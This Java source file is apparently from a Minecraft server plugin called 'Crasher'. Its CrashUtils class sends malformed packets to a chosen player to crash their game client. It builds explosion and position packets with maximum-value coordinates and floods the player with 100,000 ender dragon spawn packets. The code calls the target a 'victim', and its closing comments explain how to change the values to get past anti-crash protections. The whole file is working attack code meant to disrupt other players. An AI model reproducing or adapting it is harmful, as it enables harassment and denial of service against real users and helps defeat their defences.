package com.deathmotion.crasher;

import com.deathmotion.Crasher;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.List;
import java.util.Set;

public class CrashUtils {
    private static final String serverVersion;

    private static final Class<?> vec3D;
    private static final Class<?> packetPlayOutExplosion;
    private static final Class<?> packetPlayOutPosition;
    private static final Class<?> entityEnderDragonClass;
    private static final Class<?> craftWorldClass;
    private static final Class<?> worldClass;
    private static final Class<?> packetPlayOutSpawnEntityLivingClass;
    private static final Class<?> entityLivingClass;
    private static final Class<?> craftPlayer;
    private static final Class<?> packet;
    private static final Constructor<?> vec3DConstructor;
    private static final Constructor<?> playOutConstructor;
    private static final Constructor<?> playOutPositionConstructor;

    static {
        String path = Bukkit.getServer().getClass().getPackage().getName();
        serverVersion = path.substring(path.lastIndexOf(".") + 1);

        try {
            vec3D = Class.forName("net.minecraft.server." + serverVersion + ".Vec3D");
            packetPlayOutExplosion = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutExplosion");

            packetPlayOutPosition = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutPosition");

            entityEnderDragonClass = Class.forName("net.minecraft.server." + serverVersion + ".EntityEnderDragon");
            craftWorldClass = Class.forName("org.bukkit.craftbukkit." + serverVersion + ".CraftWorld");
            worldClass = Class.forName("net.minecraft.server." + serverVersion + ".World");
            packetPlayOutSpawnEntityLivingClass = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutSpawnEntityLiving");
            entityLivingClass = Class.forName("net.minecraft.server." + serverVersion + ".EntityLiving");

            craftPlayer = Class.forName("org.bukkit.craftbukkit." + serverVersion + ".entity.CraftPlayer");
            packet = Class.forName("net.minecraft.server." + serverVersion + ".Packet");
            vec3DConstructor = vec3D.getConstructor(double.class, double.class, double.class);
            playOutConstructor = packetPlayOutExplosion.getConstructor(double.class, double.class, double.class, float.class, List.class, vec3D);
            playOutPositionConstructor = packetPlayOutPosition.getConstructor(double.class, double.class, double.class, float.class, float.class, Set.class);
        } catch (ClassNotFoundException | NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * Crash a player hehe
     *
     * @param victim    A player, which you want to crash
     * @param crashType The method you want to crash them with
     */
    public static void crashPlayer(CommandSender crasher, Player victim, CrashType crashType) throws Exception {
            switch (crashType) {
                case EXPLOSION:
                    Object vec3d = vec3DConstructor.newInstance(
                            d(), d(), d());
                    Object explosionPacket = playOutConstructor.newInstance(
                            d(), d(), d(), f(), Collections.emptyList(), vec3d);

                    sendPacket(victim, explosionPacket);
                    break;
                case POSITION:
                    Object posPacket = playOutPositionConstructor.newInstance(
                            d(), d(), d(), f(), f(), Collections.emptySet());

                    sendPacket(victim, posPacket);
                    break;
                case ENTITY:
                    Location loc = victim.getLocation();

                    Bukkit.getScheduler().runTaskAsynchronously(Crasher.getInstance(), () -> {
                        for (int i = 0; i < 100000; i++) {
                            Object craftWorld = craftWorldClass.cast(loc.getWorld());
                            Object getHandle;
                            Constructor<?> enderDragonConstructor;
                            Object dragonEntity;
                            Constructor<?> enderDragonPacketConstructor;
                            Object enderDragonPacket;

                            try {
                                getHandle = craftWorld.getClass().getMethod("getHandle").invoke(craftWorld);
                                enderDragonConstructor = entityEnderDragonClass.getConstructor(worldClass);
                                dragonEntity = enderDragonConstructor.newInstance(getHandle);
                                enderDragonPacketConstructor = packetPlayOutSpawnEntityLivingClass.getConstructor(entityLivingClass);
                                enderDragonPacket = enderDragonPacketConstructor.newInstance(dragonEntity);

                                sendPacket(victim, enderDragonPacket);
                            } catch (Exception e) {
                                throw new RuntimeException(e);
                            }
                        }
                    });
                    break;
            }
            crasher.sendMessage(Crasher.PREFIX + "§aCrashed §2" + victim.getName() + " §ausing the §3" + crashType.name() + " §amethod!");
    }

    /**
     * Sends a NMS packet to a given player
     *
     * @param player To whom is the packet sent
     * @param packet The packet to be sent
     * @throws Exception when something goes wrong
     */
    private static void sendPacket(Player player, Object packet) throws Exception {
        Object craftPlayerObject = craftPlayer.cast(player);

        Method getHandleMethod = craftPlayer.getMethod("getHandle");
        Object handle = getHandleMethod.invoke(craftPlayerObject);
        Object pc = handle.getClass().getField("playerConnection").get(handle);

        Method sendPacketMethod = pc.getClass().getMethod("sendPacket", CrashUtils.packet);

        sendPacketMethod.invoke(pc, packet);

    }

    // Below are the numbers that you can modify to bypass anticrash.

    // Most cheat clients patched this by cancelling MAX_VALUE packets.
    // Change this to something lower such as half of double value.

    private static Double d() {
        return Double.MAX_VALUE;
    }

    private static Float f() {
        return Float.MAX_VALUE;
    }

}